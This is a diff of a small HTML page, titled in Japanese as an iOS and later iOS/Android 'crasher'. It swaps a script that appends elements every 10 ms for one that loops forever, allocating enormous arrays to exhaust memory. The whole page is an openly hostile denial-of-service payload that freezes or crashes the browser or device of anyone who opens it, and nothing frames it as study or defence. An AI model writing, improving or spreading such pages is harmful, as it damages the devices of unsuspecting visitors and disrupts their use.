@@ -1,31 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>iOSクラッシャー</title>
-<style>
-#tabContainer {
-  display: flex;
-  overflow-x: auto;
-}
-.tab {
-  min-width: 200px;
-  padding: 10px;
-  background-color: #eee;
-  margin: 10px;
-}
-</style>
+<title>iOS/Androidクラッシャー</title>
 </head>
 <body>
-<div id="tabContainer">
-  <script>
-  // 無限にタブを作成
-  setInterval(() => {
-    const tab = document.createElement('div');
-    tab.className = 'tab';
-    tab.textContent = '新しいタブ';
-    document.getElementById('tabContainer').appendChild(tab);
-  }, 10);
-  </script>
-</div>
+<script>
+// 無限ループとリソース枯渇
+while (true) {
+  var array = [];
+  for (var i = 0; i < 100000000; i++) {
+    array.push(new Array(100000000));
+  }
+}
+</script>
 </body>
 </html>
